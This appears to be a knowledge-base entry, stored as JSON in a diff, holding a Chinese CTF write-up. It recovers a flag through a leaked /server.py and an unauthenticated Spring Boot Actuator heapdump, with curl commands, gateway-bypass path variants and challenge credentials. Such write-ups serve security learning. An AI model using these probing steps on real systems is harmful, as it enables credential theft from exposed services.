@@ -1,0 +1,18 @@
+{
+ "name": "青岑-003-zhgy",
+ "title": "青岑-003-zhgy",
+ "summary": "PS87 / 864「003-zhgy（智慧果园后台管理系统）」：`/server.py` 源码泄露 + Spring Boot Actuator heapdump 未授权，直接读 secrets 还原 flag。2026-10-23 解出，285 分。",
+ "content": "# 青岑-003-zhgy\n\n> PS87 / 864「003-zhgy（智慧果园后台管理系统）」：`/server.py` 源码泄露 + Spring Boot Actuator heapdump 未授权，直接读 secrets 还原 flag。2026-10-23 解出，285 分。\n\n## 正文\n\n### 1. 入口\n\n- 实例：`http://docker.qingcen.net:<port>/`（内部 5005），`Server: BaseHTTP/0.6 Python/3.11.15`。\n- 首页是「智慧果园后台管理系统」的纯前端模板，页面被一大段 SVG 撑到 200KB+，没有表单或 API 线索。\n- 这种页面先别在 HTML 里找接口，先扫源码和常见路径。\n\n### 2. 最短路径：源码泄露\n\n`GET /server.py` 返回 200（3231 字节），`/../server.py` 同样可读。源码直接给出：\n\n```python\nSECRET_FLAG = 'flag{h34pdump_l34k_4ctu4t0r_2026}'\n\nHEAPDUMP_SECRETS = {\n    'db_password': 'DbP@ssw0rd!2026#Secure',\n    'aliyun_ak': 'LTAI5tXXXXXXXXXXXXXXXX',\n    'aliyun_sk': 'FLAG_' + SECRET_FLAG.split('{')[1].rstrip('}'),\n    'redis_password': 'R3d1s!@#2026',\n    'jwt_secret': 'sxgd_smart_park_jwt_secret_2026'\n}\n```\n\n### 3. 预期路径：Actuator heapdump 未授权\n\n- `GET /api/actuator` → 列出 `health` / `env` / `heapdump` / `configprops`。\n- `GET /api/actuator/heapdump` → 返回 `secrets`；`aliyun_sk = FLAG_h34pdump_l34k_4ctu4t0r_2026`。\n- `GET /api/jimu/actuator/heapdump` → 直接返回完整 `flag{...}`。\n- `GET /api/actuator/env` → 还能读到 DB 密码、阿里云 AK/SK、JWT secret。\n\n### 4. 复现命令\n\n```bash\ncurl -s http://<host:port>/server.py\ncurl -s http://<host:port>/api/actuator\ncurl -s http://<host:port>/api/actuator/heapdump\ncurl -s http://<host:port>/api/jimu/actuator/heapdump\n```\n\n## 关键点\n\n- **Actuator 未授权**：先试 `/actuator`、`/actuator/env`、`/actuator/heapdump`。heapdump 里常有 DB 密码、云 AK/SK、JWT secret。\n- 本题的 flag 由 `aliyun_sk` 的 `FLAG_` 前缀 + 内容还原；`/api/jimu/actuator/heapdump` 直接给完整 flag。\n- 源码泄露（`/server.py`）再次是最短路径；先扫源码，再谈 CVE/利用链。\n- 路径变体值得试：`/api/<module>/actuator/heapdump`，网关常只拦 `/api/actuator` 而放过模块前缀（jimu/auth/manage）。\n\n## 关联\n\n- [[Web-源码泄露与信息收集]] —— 先扫 `/server.py` 与 `/.git/HEAD`\n- [[Web-CVE复现与已知漏洞利用]] —— Actuator 未授权属于框架/中间件 N-day 面\n- [[青岑-001-water-query]] —— 同一 PS87 题集、同一源码泄露套路\n- [[青岑-License授权管理系统]] —— 同题集 0 解题，对照\"源码拿不到时\"的卡点\n- [[CTF-竞赛总览与解题流程]] —— 标准六步\n\n## 存疑 / 矛盾\n\n- 该 flag 是静态 flag，源码与 heapdump 都能拿到；平台已接受（285 分）。\n- 实例端口每次重建都会变；`server.py` 的源码可能随题目更新。\n\n## 来源\n\n- 糯米内建知识整理 · 2026-10-23（本次实战，无外部文件）\n- 原始请求与回显见本页正文；未写入平台账号凭据\n",
+ "section": "project",
+ "group": "project",
+ "links": {
+  "internal": [
+   "CTF-竞赛总览与解题流程",
+   "Web-CVE复现与已知漏洞利用",
+   "Web-源码泄露与信息收集",
+   "青岑-001-water-query",
+   "青岑-License授权管理系统"
+  ],
+  "unresolvedCount": 0
+ }
+}
